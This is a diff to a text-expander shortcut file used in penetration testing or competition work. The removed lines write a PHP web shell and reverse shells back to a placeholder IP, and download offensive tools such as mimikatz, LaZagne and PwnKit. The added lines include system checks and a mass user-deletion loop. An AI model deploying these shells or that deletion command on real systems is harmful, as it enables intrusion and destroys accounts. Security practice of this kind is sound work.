@@ -20,30 +20,11 @@ matches:
   - trigger: ":ip"
     replace: "{{IP}}"
                   
-# SETUP AND NMAP              
+# SETUP            
   - trigger: ":setup"                  
     replace : |          
-      rm -rf ~/net
-      mkdir ~/box
-      mkdir -p net && cd net         
-      echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > webshell.php
-      echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'\"); ?>" > revshell.php
-      echo "bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'" > bashshell.sh
-      cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . &
-      wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh & 
-      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/winPEASany.exe -O winpeas.exe & 
-      wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 &
-      wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 &
-      wget -q https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip && unzip SharpHound-v1.1.0.zip &
-      wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 &
-      wget -q https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe &
-      wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe &
-      wget -q https://github.com/ly4k/PwnKit/raw/main/PwnKit &
-      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz & 
-      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz &
-      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip && unzip -o ligolo-ng_agent_0.4.4_windows_amd64.zip  &
-      sudo python3 -m http.server 80 &
-      mv ~/box
+      sudo apt install net-tools &
+      sudo apt install ufw &
 
   - trigger: ":pyserver"
     replace: "python3 -m http.sever "                                                                           
@@ -79,10 +60,24 @@ matches:
   - trigger: ":wget"
     replace: wget http://{{IP}}/
 
+# SETUP
+
+  - trigger: ":cleanusers"
+    replace: for user in $(awk -F':' '{ if ($1 != "scoreuser" && $1 != "user2" && $3 >= 1000) print $1 }' /etc/passwd); do sudo userdel -r $user; done
+
 # Persist Check
+
+  - trigger: ":checkusers"
+    replace: cat /etc/passwd | grep /*sh
 
   - trigger: ":suid"
     replace: find / -perm -u=s -type f 2>/dev/null
+
+  - trigger: ":checkcron"
+    replace: sudo ls -la /etc/cron.* && sudo ls -la /var/spool/cron/crontabs
+
+  - trigger: ":bashrc"
+    replace: sudo find / -name *bashrc 2>/dev/null
 
 # Troll
 
